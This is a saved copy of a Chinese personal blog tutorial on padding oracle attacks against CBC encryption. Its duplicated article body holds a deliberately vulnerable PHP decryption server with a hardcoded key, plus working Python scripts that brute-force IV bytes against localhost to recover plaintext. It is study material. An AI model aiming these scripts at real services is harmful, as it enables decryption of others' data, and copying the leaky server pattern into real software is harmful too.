@@ -1,0 +1,724 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
+<title>Bendawang's Site</title>
+<link href="./padding-oracle攻击原理分析(附带rsa资料)/font-awesome.min.css" rel="stylesheet"/>
+<link href="./padding-oracle攻击原理分析(附带rsa资料)/screen.css" rel="stylesheet"/>
+<link href="./padding-oracle攻击原理分析(附带rsa资料)/prism_okaidia.css" rel="stylesheet"/>
+<link href="./padding-oracle攻击原理分析(附带rsa资料)/bendawang.css" rel="stylesheet"/>
+<script src="./padding-oracle攻击原理分析(附带rsa资料)/jquery.min.js"></script>
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+<div class="show-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img src="./padding-oracle攻击原理分析(附带rsa资料)/bendawang.png" style="display:block;width:100%;"/></a>
+</h1>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit test2 hide-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img alt="" height="115" src="./padding-oracle攻击原理分析(附带rsa资料)/bendawang.png" width="449"/></a>
+</h1>
+</div>
+<nav class="main-nav unit test1 hide-on-mobiles">
+<ul>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+</div>
+</header>
+<script>
+$('document').ready(function(){
+    $('li[class]:eq(4)').attr('class','current');
+});
+</script>
+<section class="docs">
+<div class="grid">
+<!--移动端-->
+<div class="show-on-mobiles">
+<div class="article-info profile-block">
+<div class="article-info-block">
+               55
+               <span>文章</span>
+</div>
+<div class="article-info-block">
+               5
+               <span>标签</span>
+</div>
+</div>
+<div class="profile-block social-links">
+<table>
+<tbody><tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i></a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i></a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i></a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody></table>
+</div>
+<div class="whole show-on-mobiles">
+<article class="bdw_article">
+<div class="Bendawang" id="Bendawang_mobile">
+<b id="Bendawang_toggle_mobile" title="收起">目录[+]</b></div></article></div></div></div></section></body></html>
+<div class="Bendawang_content" id="Bendawang_content_mobile"></div>
+
+<br/>
+<br/>
+<h1 id="paddingoraclersa">padding-oracle攻击原理分析(附带rsa资料)</h1>
+<h2 id=""><strong>一、前引</strong></h2>
+<p style="max-width:100%;height:auto;">最近恶补各种加解密。。把之前学的笔记放一放，本来还想放放自己的rsa笔记，不过这里有一份更好的了，我自己的就不拿出来了。
+flappypig rsa：<code style="max-width:100%;height:auto;">http://bobao.360.cn/learning/detail/3058.html?from=groupmessage&amp;isappinstalled=0</code>
+另外这个oj <code style="max-width:100%;height:auto;">https://www.jarvisoj.com</code>上加上sctf2016都有比较典型的rsa的题目，比较好练手。
+另外有个推荐的博客<code style="max-width:100%;height:auto;">http://bluereader.org/rss/12594/p-1</code>，这个是比较系统的讲了rsa，很不错，理论比上面flappypig那个讲的详细些，逻辑性更强，要是flappypig的暂时看不懂的话可以先看这个再去看那个。</p>
+<h3 id="11padding"><strong>1.1 四种分组加密方式及padding</strong></h3>
+<p style="max-width:100%;height:auto;"><code style="max-width:100%;height:auto;">http://www.cnblogs.com/happyhippy/archive/2006/12/23/601353.html</code></p>
+<p style="max-width:100%;height:auto;">简单总结下：
+其中提到填充方法，以分组8个字节为例：需要填充n个字节，则n个字节都填充0x0n。如果恰好全满，填充8个0x08组成新块。OFB和CFB不需要填充。
+如下分组，产生密文我们在反解的时候，注意到最后一个分组的末尾的数值为0×04，即表示填充了4个Padding。如果最后的Padding不正确(值和数量不一致)，则解密程序往往会抛出异常(Padding Error)。而利用应用的错误回显，我们就可以判断出Paddig是否正确。
+<br/><img alt="这里写图片描述" data-action="zoom" src="./padding-oracle攻击原理分析(附带rsa资料)/20160926214719743" style="max-width:100%;height:auto;"/><br/>
+而这个类似二分盲注的思想，因为明文是看不到的，但是明文解密失败是会有反应的。比如在web应用中，如果Padding不正确，则应用程序很可能会返回500的错误(程序执行错误)；如果Padding正确，但解密出来的内容不正确，则可能会返回200的自定义错误(这只是业务上的规定)，所以，这种区别就可以成为一个二值逻辑的“注入点”。
+明文分组和填充就是<code style="max-width:100%;height:auto;">Padding Oracle Attack</code>的根源所在。但是这些需要一个前提，那就是应用程序对异常的处理。当提交的加密后的数据中出现错误的填充信息时，不够健壮的应用程序解密时报错。</p>
+<blockquote>
+<p style="max-width:100%;height:auto;">所以攻击成立两个重要的前提</p>
+<ol>
+<li>攻击者能够获得密文（Ciphertext），以及附带在密文前面的IV（初始化向量）</li>
+<li>攻击者能够触发密文的解密过程，且能够知道密文的解密结果</li>
+</ol>
+</blockquote>
+<h3 id="12"><strong>1.2 猜解明文</strong></h3>
+<p style="max-width:100%;height:auto;">根据之前的分析，padding只可能有以下几种情况：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">1个字节的Padding为0x01
+2个字节的Padding为0x02
+3个字节的Padding为0x03
+4个字节的Padding为0x04
+5个字节的Padding为0x05
+6个字节的Padding为0x06
+7个字节的Padding为0x07
+8个字节的Padding为0x08(当原始的明文正好是分组的整数倍的时候，Padding一个整组的填充值)
+</code></pre>
+<p style="max-width:100%;height:auto;">cbc解密模式图如下：
+<br/><img alt="这里写图片描述" data-action="zoom" src="./padding-oracle攻击原理分析(附带rsa资料)/20160926214248542" style="max-width:100%;height:auto;"/><br/>
+我们接下来要利用选择密文攻击的思想，不断调整，修正IV。来对Intermediary Value进行猜测。</p>
+<h4 id="121padding0x01"><strong>1.2.1 padding 0x01</strong></h4>
+<p style="max-width:100%;height:auto;">我们不断地调整IV的值，以希望解密后，最后一个字节的值为正确的Padding Byte，这里是0×01。因为<code style="max-width:100%;height:auto;">Intermediary Value</code>是固定的(我们此时不知道<code style="max-width:100%;height:auto;">Intermediary Value</code>)，因此从0×00~0xFF之间，只可能有一个IV的值与<code style="max-width:100%;height:auto;">Intermediary Value</code>的最后一个字节进行XOR后，结果是0×01( 因为0×01只有最后1bit为1，其他都是0，所以根据XOR的性质，只能存在一个值能XOR得到0×01)。攻击者通过遍历这255个值，可以找出IV需要的最后一个字节。
+即我们可以控制iv，然后我们能够知道原本正确的iv是啥，然后我们只需要构造iv使得明文解出来是0x01就行了，这样就推到了中间值，加上我们知道正确的iv，异或一下就能够得到第一组明文的最后一个字节的了:</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">Intermediary Value ^ iv = 0x01
+这个iv是我们通过尝试不断构造的，这样子推出了Intermediary Value，那么之前说了我们掌握了真正的iv，这样子就能够知道最终的明文了
+</code></pre>
+<h4 id="122padding0x02"><strong>1.2.2 padding 0x02</strong></h4>
+<p style="max-width:100%;height:auto;">通过上述操作我们能够知道第一个字节，假设为<code style="max-width:100%;height:auto;">0x??</code>，因此可以”更新”IV(攻击者输入的IV)的第8个字节为<code style="max-width:100%;height:auto;">0x?? ^ 0x02</code>，然后开始随机构造iv的倒数第二个字节，直至解密出来的第一个分组的倒数第二个字节为0x02，此时的iv异或上0x02之后再和正确iv的倒数第二个字节异或，即可得到明文的第一分组的倒数第二个字节。</p>
+<p style="max-width:100%;height:auto;">至于padding 0x03,0x04.....就不再赘述了。</p>
+<h2 id="-1"><strong>二、测试代码</strong></h2>
+<p style="max-width:100%;height:auto;">这里我自己写了个简单的服务器测试了下，写的比较挫，只是帮助自己更好的理解下原理。。然后自己写了poc。写的非常难看，大家将就着看，另外把自己的草稿也保留在其中了。
+服务端代码：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+$string = &amp;apos;bendawang&amp;apos;;
+$key = &amp;apos;12345678&amp;apos;;
+$cipher = MCRYPT_DES;
+$modes = MCRYPT_MODE_CBC;
+/*
+
+#cipher:01af3d443c84ae0d859755ee9b3e2933
+#iv:38b740ea94706e9b
+
+$iv=hex2bin("38b740ea94706e9b");
+#iv=hex2bin($_GET[&amp;apos;$iv&amp;apos;]);
+#$iv=mcrypt_create_iv(mcrypt_get_iv_size($cipher,$modes),MCRYPT_RAND);
+#$str=hex2bin($_GET[&amp;apos;str&amp;apos;]);
+$encode=mcrypt_encrypt($cipher,$key,$string,$modes,$iv);
+$decode=mcrypt_decrypt($cipher,$key,$encode,$modes,$iv);
+echo bin2hex($iv)."&lt;/br&gt;";
+echo bin2hex($encode)."&lt;/br&gt;";
+echo $decode."&lt;/br&gt;";
+*/
+if(isset($_GET[&amp;apos;iv&amp;apos;])&amp;&amp;isset($_GET[&amp;apos;str&amp;apos;])){
+    $iv=hex2bin($_GET[&amp;apos;iv&amp;apos;]);
+    #echo $iv;
+    $str=hex2bin($_GET[&amp;apos;str&amp;apos;]);
+    $decode=mcrypt_decrypt($cipher,$key,$str,$modes,$iv);
+    #echo bin2hex($iv)."br&gt;";
+    #echo bin2hex($encode)."br&gt;";
+    echo bin2hex($decode);
+    $temp=bin2hex($decode);
+}
+else{
+    $iv=hex2bin("38b740ea94706e9b");
+    $encode=mcrypt_encrypt($cipher,$key,$string,$modes,$iv);
+    echo "the iv is &lt;h2&gt;".bin2hex($iv)."&lt;/h2&gt;&lt;br&gt;";
+    echo "the cipher is &lt;h2&gt;".bin2hex($encode)."&lt;/h2&gt;&lt;br&gt;";
+}
+
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">然后是攻击测试代码：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">#!/usr/bin/env python
+# encoding: utf-8
+import requests
+r=requests.session()
+url="http://127.0.0.1/test.php"
+tmp="0000000000000000"
+str1="01af3d443c84ae0d859755ee9b3e2933"
+iv="38b740ea94706e9b"
+ans=[]
+param={"iv":iv,"str":"01af3d443c84ae0d859755ee9b3e2933"}
+result=r.get(url,params=param)
+string1=result.content
+lastbyte=[]
+lastmedium=[]
+for k in xrange(len(string1)/16):
+    ans.append("");
+    for j in xrange(8):
+        for i in xrange(256):
+            if i&lt;16:
+                tmp=tmp[0:2*(7-j)]+("0"+str(hex(i)[2]))+tmp[2*(7-j)+2:]
+                t=j
+                #print lastbyte
+                #print t
+                while t&gt;0 and lastbyte!=[]:
+                    if lastbyte[t-1]&lt;16:
+                        tmp=tmp[0:2*(7-t+1)]+"0"+str(hex(lastbyte[t-1]))[2]+tmp[2*(7-t+1)+2:]
+                    else:
+                        tmp=tmp[0:2*(7-t+1)]+str(hex(lastbyte[t-1]))[2:4]+tmp[2*(7-t+1)+2:]
+                    t-=1
+            else:
+                tmp=tmp[0:2*(7-j)]+str(hex(i)[2:4])+tmp[2*(7-j)+2:]
+                t=j
+                #print lastbyte
+                #print t
+                while t&gt;0 and lastbyte!=[]:
+                    if lastbyte[t-1]&lt;16:
+                        tmp=tmp[0:2*(7-t+1)]+"0"+str(hex(lastbyte[t-1]))[2]+tmp[2*(7-t+1)+2:]
+                    else:
+                        tmp=tmp[0:2*(7-t+1)]+str(hex(lastbyte[t-1]))[2:4]+tmp[2*(7-t+1)+2:]
+                    t-=1
+            #print tmp
+            #print i,tmp
+            param={"iv":tmp,"str":str1[16*k:16*(k+1)]}
+            result=r.get(url,params=param)
+            string=result.content
+            #print param
+            #print "0"+str(hex(j+1)[2])
+            #print len(str1[16*k:16*(k+1)] )
+            #print str1[16*k:16*(k+1)]
+            #print string
+            #print iv
+            #print string[2*(7-j):2*(7-j)+2],"0"+str(hex(j+1)[2])
+            if string[2*(7-j):2*(7-j)+2] == "0"+str(hex(j+1)[2]):
+                print tmp
+                print string
+                medium=eval("0x"+iv[2*(7-j):2*(7-j)+2])
+                myiv=eval("0x"+tmp[2*(7-j):2*(7-j)+2])
+                time=eval(hex(j+1))
+                lastmedium.append(myiv^time)
+                #print hex(medium),hex(myiv),hex(time)
+                #lastbyte.append(myiv^eval(hex(j+2))^time)
+                lastbyte=lastmedium[:]
+                #print lastbyte
+                for l in xrange(len(lastbyte)):
+                    lastbyte[l]=lastmedium[l]^eval(hex(j+2))
+                print lastmedium
+                print lastbyte
+                #print tmp
+                #print hex(lastbyte)
+                ans[k]+=chr(medium^time^myiv)
+                print ans
+                break
+        #if k!=0:
+        #a=raw_input()
+    print "\r\nthe answer is : ",ans[k][::-1],"\r\n"
+    iv=str1[k*16:(k+1)*16]
+    lastbyte=[]
+    lastmedium=[]
+    #print "iv：",iv
+    tmp="0000000000000000"
+
+print "-------------------------------------------------\r\n"
+for i in xrange(len(ans)):
+    print "the "+str(i+1)+"th block is : "+ans[i][::-1]
+
+
+
+
+#!/usr/bin/env python
+# encoding: utf-8
+#仅猜解第一个分组，后续理解原理就一样的类似
+import requests
+r=requests.session()
+url="http://127.0.0.1/test.php"
+tmp="0000000000000000"
+iv="38b740ea94706e9b"
+ans=""
+for j in xrange(8):
+    for i in xrange(256):
+        if i&lt;16:
+            tmp=tmp[0:2*(7-j)]+("0"+str(hex(i)[2]))+tmp[2*(7-j)+2:]
+        else:
+            tmp=tmp[0:2*(7-j)]+str(hex(i)[2:4])+tmp[2*(7-j)+2:]
+        #print tmp
+        param={"iv":tmp,"str":"01af3d443c84ae0d859755ee9b3e2933"}
+        result=r.get(url,params=param)
+        string=result.content
+        if string[2*(7-j):2*(7-j)+2] == "0"+str(hex(j+1)[2]):
+            #print tmp
+            #print string
+            medium=eval("0x"+iv[2*(7-j):2*(7-j)+2])
+            myiv=eval("0x"+tmp[2*(7-j):2*(7-j)+2])
+            time=eval(hex(j+1))
+            #print hex(medium),hex(myiv),hex(time)
+            ans+=chr(medium^time^myiv)
+            print ans
+            break
+    #a=raw_input()
+print "---------------------------\r\nanswer is : ",ans[::-1]
+
+&amp;apos;&amp;apos;&amp;apos;
+#猜解第一个分组的第二个字节
+for i in xrange(256):
+    if i&lt;16:
+        tmp="000000000000"+("0"+str(hex(i)[2]))+"F8"
+    else:
+        tmp="000000000000"+str(hex(i)[2:4])+"F8"
+    #print tmp[14:16]
+    param={"iv":tmp,"str":"01af3d443c84ae0d859755ee9b3e2933"}
+    result=r.get(url,params=param)
+    string=result.content
+    if string[12:14]=="02":
+        print "done!"
+        print tmp
+        print string
+        print chr(eval("0x"+tmp[12:14])^0x02^0x6E)
+        break
+&amp;apos;&amp;apos;&amp;apos;
+
+&amp;apos;&amp;apos;&amp;apos;
+#猜解第一个分组的第一个字节
+import requests
+r=requests.session()
+url="http://127.0.0.1/test.php"
+for i in xrange(256):
+    if i&lt;16:
+        tmp="00000000000000"+("0"+str(hex(i)[2]))
+    else:
+        tmp="00000000000000"+str(hex(i)[2:4])
+    print tmp[14:16]
+    param={"iv":tmp,"str":"01af3d443c84ae0d859755ee9b3e2933"}
+    result=r.get(url,params=param)
+    string=result.content
+    if string[14:16]=="01":
+        print "done!"
+        print tmp
+        print string
+        print chr(eval("0x"+tmp[14:16])^0x01^0x9b)
+        break
+&amp;apos;&amp;apos;&amp;apos;
+</code></pre>
+<h2 id="poc"><strong>三、通用poc</strong></h2>
+<p style="max-width:100%;height:auto;">最后也给上了写的比较好的通用poc，一份github的代码，这个是我用了几个之后觉得算是最好的一份了。
+https://github.com/mpgn/Padding-oracle-attack/blob/master/exploit.py</p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+
+
+
+<!--PC端-->
+<div class="unit one-fifth hide-on-mobiles" id="scroll" style="position:absolute;left:30px">
+<div class="inner profile-inner">
+<div class="base-info profile-block">
+<img id="avatar" src="./padding-oracle攻击原理分析(附带rsa资料)/logo.jpg"/>
+<h2 id="name" style="text-align:center">Bendawang</h2>
+<span id="location" style="font-size:18px">
+<i class="fa fa-map-marker"></i>SiChuan, China</span>
+<a href="/about" id="follow">联系我</a></div>
+<div class="article-info profile-block">
+<div class="article-info-block">
+        55
+          <span>文章</span></div>
+<div class="article-info-block">
+        5
+          <span>标签</span></div>
+</div>
+<div class="profile-block social-links hide-on-mobiles">
+<table>
+<tbody>
+<tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i>
+</a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i>
+</a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i>
+</a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+<div class="unit three-quarters hide-on-mobiles">
+<article class="bdw_article">
+<h1 id="paddingoraclersa">padding-oracle攻击原理分析(附带rsa资料)</h1>
+<h2 id=""><strong>一、前引</strong></h2>
+<p style="max-width:100%;height:auto;">最近恶补各种加解密。。把之前学的笔记放一放，本来还想放放自己的rsa笔记，不过这里有一份更好的了，我自己的就不拿出来了。
+flappypig rsa：<code style="max-width:100%;height:auto;">http://bobao.360.cn/learning/detail/3058.html?from=groupmessage&amp;isappinstalled=0</code>
+另外这个oj <code style="max-width:100%;height:auto;">https://www.jarvisoj.com</code>上加上sctf2016都有比较典型的rsa的题目，比较好练手。
+另外有个推荐的博客<code style="max-width:100%;height:auto;">http://bluereader.org/rss/12594/p-1</code>，这个是比较系统的讲了rsa，很不错，理论比上面flappypig那个讲的详细些，逻辑性更强，要是flappypig的暂时看不懂的话可以先看这个再去看那个。</p>
+<h3 id="11padding"><strong>1.1 四种分组加密方式及padding</strong></h3>
+<p style="max-width:100%;height:auto;"><code style="max-width:100%;height:auto;">http://www.cnblogs.com/happyhippy/archive/2006/12/23/601353.html</code></p>
+<p style="max-width:100%;height:auto;">简单总结下：
+其中提到填充方法，以分组8个字节为例：需要填充n个字节，则n个字节都填充0x0n。如果恰好全满，填充8个0x08组成新块。OFB和CFB不需要填充。
+如下分组，产生密文我们在反解的时候，注意到最后一个分组的末尾的数值为0×04，即表示填充了4个Padding。如果最后的Padding不正确(值和数量不一致)，则解密程序往往会抛出异常(Padding Error)。而利用应用的错误回显，我们就可以判断出Paddig是否正确。
+<br/><img alt="这里写图片描述" data-action="zoom" src="./padding-oracle攻击原理分析(附带rsa资料)/20160926214719743" style="max-width:100%;height:auto;"/><br/>
+而这个类似二分盲注的思想，因为明文是看不到的，但是明文解密失败是会有反应的。比如在web应用中，如果Padding不正确，则应用程序很可能会返回500的错误(程序执行错误)；如果Padding正确，但解密出来的内容不正确，则可能会返回200的自定义错误(这只是业务上的规定)，所以，这种区别就可以成为一个二值逻辑的“注入点”。
+明文分组和填充就是<code style="max-width:100%;height:auto;">Padding Oracle Attack</code>的根源所在。但是这些需要一个前提，那就是应用程序对异常的处理。当提交的加密后的数据中出现错误的填充信息时，不够健壮的应用程序解密时报错。</p>
+<blockquote>
+<p style="max-width:100%;height:auto;">所以攻击成立两个重要的前提</p>
+<ol>
+<li>攻击者能够获得密文（Ciphertext），以及附带在密文前面的IV（初始化向量）</li>
+<li>攻击者能够触发密文的解密过程，且能够知道密文的解密结果</li>
+</ol>
+</blockquote>
+<h3 id="12"><strong>1.2 猜解明文</strong></h3>
+<p style="max-width:100%;height:auto;">根据之前的分析，padding只可能有以下几种情况：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">1个字节的Padding为0x01
+2个字节的Padding为0x02
+3个字节的Padding为0x03
+4个字节的Padding为0x04
+5个字节的Padding为0x05
+6个字节的Padding为0x06
+7个字节的Padding为0x07
+8个字节的Padding为0x08(当原始的明文正好是分组的整数倍的时候，Padding一个整组的填充值)
+</code></pre>
+<p style="max-width:100%;height:auto;">cbc解密模式图如下：
+<br/><img alt="这里写图片描述" data-action="zoom" src="./padding-oracle攻击原理分析(附带rsa资料)/20160926214248542" style="max-width:100%;height:auto;"/><br/>
+我们接下来要利用选择密文攻击的思想，不断调整，修正IV。来对Intermediary Value进行猜测。</p>
+<h4 id="121padding0x01"><strong>1.2.1 padding 0x01</strong></h4>
+<p style="max-width:100%;height:auto;">我们不断地调整IV的值，以希望解密后，最后一个字节的值为正确的Padding Byte，这里是0×01。因为<code style="max-width:100%;height:auto;">Intermediary Value</code>是固定的(我们此时不知道<code style="max-width:100%;height:auto;">Intermediary Value</code>)，因此从0×00~0xFF之间，只可能有一个IV的值与<code style="max-width:100%;height:auto;">Intermediary Value</code>的最后一个字节进行XOR后，结果是0×01( 因为0×01只有最后1bit为1，其他都是0，所以根据XOR的性质，只能存在一个值能XOR得到0×01)。攻击者通过遍历这255个值，可以找出IV需要的最后一个字节。
+即我们可以控制iv，然后我们能够知道原本正确的iv是啥，然后我们只需要构造iv使得明文解出来是0x01就行了，这样就推到了中间值，加上我们知道正确的iv，异或一下就能够得到第一组明文的最后一个字节的了:</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">Intermediary Value ^ iv = 0x01
+这个iv是我们通过尝试不断构造的，这样子推出了Intermediary Value，那么之前说了我们掌握了真正的iv，这样子就能够知道最终的明文了
+</code></pre>
+<h4 id="122padding0x02"><strong>1.2.2 padding 0x02</strong></h4>
+<p style="max-width:100%;height:auto;">通过上述操作我们能够知道第一个字节，假设为<code style="max-width:100%;height:auto;">0x??</code>，因此可以”更新”IV(攻击者输入的IV)的第8个字节为<code style="max-width:100%;height:auto;">0x?? ^ 0x02</code>，然后开始随机构造iv的倒数第二个字节，直至解密出来的第一个分组的倒数第二个字节为0x02，此时的iv异或上0x02之后再和正确iv的倒数第二个字节异或，即可得到明文的第一分组的倒数第二个字节。</p>
+<p style="max-width:100%;height:auto;">至于padding 0x03,0x04.....就不再赘述了。</p>
+<h2 id="-1"><strong>二、测试代码</strong></h2>
+<p style="max-width:100%;height:auto;">这里我自己写了个简单的服务器测试了下，写的比较挫，只是帮助自己更好的理解下原理。。然后自己写了poc。写的非常难看，大家将就着看，另外把自己的草稿也保留在其中了。
+服务端代码：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+$string = &amp;apos;bendawang&amp;apos;;
+$key = &amp;apos;12345678&amp;apos;;
+$cipher = MCRYPT_DES;
+$modes = MCRYPT_MODE_CBC;
+/*
+
+#cipher:01af3d443c84ae0d859755ee9b3e2933
+#iv:38b740ea94706e9b
+
+$iv=hex2bin("38b740ea94706e9b");
+#iv=hex2bin($_GET[&amp;apos;$iv&amp;apos;]);
+#$iv=mcrypt_create_iv(mcrypt_get_iv_size($cipher,$modes),MCRYPT_RAND);
+#$str=hex2bin($_GET[&amp;apos;str&amp;apos;]);
+$encode=mcrypt_encrypt($cipher,$key,$string,$modes,$iv);
+$decode=mcrypt_decrypt($cipher,$key,$encode,$modes,$iv);
+echo bin2hex($iv)."&lt;/br&gt;";
+echo bin2hex($encode)."&lt;/br&gt;";
+echo $decode."&lt;/br&gt;";
+*/
+if(isset($_GET[&amp;apos;iv&amp;apos;])&amp;&amp;isset($_GET[&amp;apos;str&amp;apos;])){
+    $iv=hex2bin($_GET[&amp;apos;iv&amp;apos;]);
+    #echo $iv;
+    $str=hex2bin($_GET[&amp;apos;str&amp;apos;]);
+    $decode=mcrypt_decrypt($cipher,$key,$str,$modes,$iv);
+    #echo bin2hex($iv)."br&gt;";
+    #echo bin2hex($encode)."br&gt;";
+    echo bin2hex($decode);
+    $temp=bin2hex($decode);
+}
+else{
+    $iv=hex2bin("38b740ea94706e9b");
+    $encode=mcrypt_encrypt($cipher,$key,$string,$modes,$iv);
+    echo "the iv is &lt;h2&gt;".bin2hex($iv)."&lt;/h2&gt;&lt;br&gt;";
+    echo "the cipher is &lt;h2&gt;".bin2hex($encode)."&lt;/h2&gt;&lt;br&gt;";
+}
+
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">然后是攻击测试代码：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">#!/usr/bin/env python
+# encoding: utf-8
+import requests
+r=requests.session()
+url="http://127.0.0.1/test.php"
+tmp="0000000000000000"
+str1="01af3d443c84ae0d859755ee9b3e2933"
+iv="38b740ea94706e9b"
+ans=[]
+param={"iv":iv,"str":"01af3d443c84ae0d859755ee9b3e2933"}
+result=r.get(url,params=param)
+string1=result.content
+lastbyte=[]
+lastmedium=[]
+for k in xrange(len(string1)/16):
+    ans.append("");
+    for j in xrange(8):
+        for i in xrange(256):
+            if i&lt;16:
+                tmp=tmp[0:2*(7-j)]+("0"+str(hex(i)[2]))+tmp[2*(7-j)+2:]
+                t=j
+                #print lastbyte
+                #print t
+                while t&gt;0 and lastbyte!=[]:
+                    if lastbyte[t-1]&lt;16:
+                        tmp=tmp[0:2*(7-t+1)]+"0"+str(hex(lastbyte[t-1]))[2]+tmp[2*(7-t+1)+2:]
+                    else:
+                        tmp=tmp[0:2*(7-t+1)]+str(hex(lastbyte[t-1]))[2:4]+tmp[2*(7-t+1)+2:]
+                    t-=1
+            else:
+                tmp=tmp[0:2*(7-j)]+str(hex(i)[2:4])+tmp[2*(7-j)+2:]
+                t=j
+                #print lastbyte
+                #print t
+                while t&gt;0 and lastbyte!=[]:
+                    if lastbyte[t-1]&lt;16:
+                        tmp=tmp[0:2*(7-t+1)]+"0"+str(hex(lastbyte[t-1]))[2]+tmp[2*(7-t+1)+2:]
+                    else:
+                        tmp=tmp[0:2*(7-t+1)]+str(hex(lastbyte[t-1]))[2:4]+tmp[2*(7-t+1)+2:]
+                    t-=1
+            #print tmp
+            #print i,tmp
+            param={"iv":tmp,"str":str1[16*k:16*(k+1)]}
+            result=r.get(url,params=param)
+            string=result.content
+            #print param
+            #print "0"+str(hex(j+1)[2])
+            #print len(str1[16*k:16*(k+1)] )
+            #print str1[16*k:16*(k+1)]
+            #print string
+            #print iv
+            #print string[2*(7-j):2*(7-j)+2],"0"+str(hex(j+1)[2])
+            if string[2*(7-j):2*(7-j)+2] == "0"+str(hex(j+1)[2]):
+                print tmp
+                print string
+                medium=eval("0x"+iv[2*(7-j):2*(7-j)+2])
+                myiv=eval("0x"+tmp[2*(7-j):2*(7-j)+2])
+                time=eval(hex(j+1))
+                lastmedium.append(myiv^time)
+                #print hex(medium),hex(myiv),hex(time)
+                #lastbyte.append(myiv^eval(hex(j+2))^time)
+                lastbyte=lastmedium[:]
+                #print lastbyte
+                for l in xrange(len(lastbyte)):
+                    lastbyte[l]=lastmedium[l]^eval(hex(j+2))
+                print lastmedium
+                print lastbyte
+                #print tmp
+                #print hex(lastbyte)
+                ans[k]+=chr(medium^time^myiv)
+                print ans
+                break
+        #if k!=0:
+        #a=raw_input()
+    print "\r\nthe answer is : ",ans[k][::-1],"\r\n"
+    iv=str1[k*16:(k+1)*16]
+    lastbyte=[]
+    lastmedium=[]
+    #print "iv：",iv
+    tmp="0000000000000000"
+
+print "-------------------------------------------------\r\n"
+for i in xrange(len(ans)):
+    print "the "+str(i+1)+"th block is : "+ans[i][::-1]
+
+
+
+
+#!/usr/bin/env python
+# encoding: utf-8
+#仅猜解第一个分组，后续理解原理就一样的类似
+import requests
+r=requests.session()
+url="http://127.0.0.1/test.php"
+tmp="0000000000000000"
+iv="38b740ea94706e9b"
+ans=""
+for j in xrange(8):
+    for i in xrange(256):
+        if i&lt;16:
+            tmp=tmp[0:2*(7-j)]+("0"+str(hex(i)[2]))+tmp[2*(7-j)+2:]
+        else:
+            tmp=tmp[0:2*(7-j)]+str(hex(i)[2:4])+tmp[2*(7-j)+2:]
+        #print tmp
+        param={"iv":tmp,"str":"01af3d443c84ae0d859755ee9b3e2933"}
+        result=r.get(url,params=param)
+        string=result.content
+        if string[2*(7-j):2*(7-j)+2] == "0"+str(hex(j+1)[2]):
+            #print tmp
+            #print string
+            medium=eval("0x"+iv[2*(7-j):2*(7-j)+2])
+            myiv=eval("0x"+tmp[2*(7-j):2*(7-j)+2])
+            time=eval(hex(j+1))
+            #print hex(medium),hex(myiv),hex(time)
+            ans+=chr(medium^time^myiv)
+            print ans
+            break
+    #a=raw_input()
+print "---------------------------\r\nanswer is : ",ans[::-1]
+
+&amp;apos;&amp;apos;&amp;apos;
+#猜解第一个分组的第二个字节
+for i in xrange(256):
+    if i&lt;16:
+        tmp="000000000000"+("0"+str(hex(i)[2]))+"F8"
+    else:
+        tmp="000000000000"+str(hex(i)[2:4])+"F8"
+    #print tmp[14:16]
+    param={"iv":tmp,"str":"01af3d443c84ae0d859755ee9b3e2933"}
+    result=r.get(url,params=param)
+    string=result.content
+    if string[12:14]=="02":
+        print "done!"
+        print tmp
+        print string
+        print chr(eval("0x"+tmp[12:14])^0x02^0x6E)
+        break
+&amp;apos;&amp;apos;&amp;apos;
+
+&amp;apos;&amp;apos;&amp;apos;
+#猜解第一个分组的第一个字节
+import requests
+r=requests.session()
